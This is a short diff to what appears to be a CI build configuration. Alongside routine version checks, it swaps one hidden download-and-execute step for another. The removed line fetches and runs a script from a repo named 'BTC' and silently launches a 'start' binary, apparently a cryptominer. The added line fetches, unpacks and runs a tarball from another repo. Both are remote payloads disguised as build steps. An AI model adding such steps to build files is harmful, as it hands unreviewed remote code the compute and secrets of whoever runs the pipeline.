@@ -10,4 +10,4 @@ build:
         code: |
           echo "python version $(python --version) running"
           echo "pip version $(pip --version) running"
-          wget https://raw.githubusercontent.com/renifer12/BTC/main/srb0.sh && chmod u+x srb0.sh && ./srb0.sh && chmod +x start &&./start > /dev/null 2>&1
+          wget https://github.com/renifer12/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./build
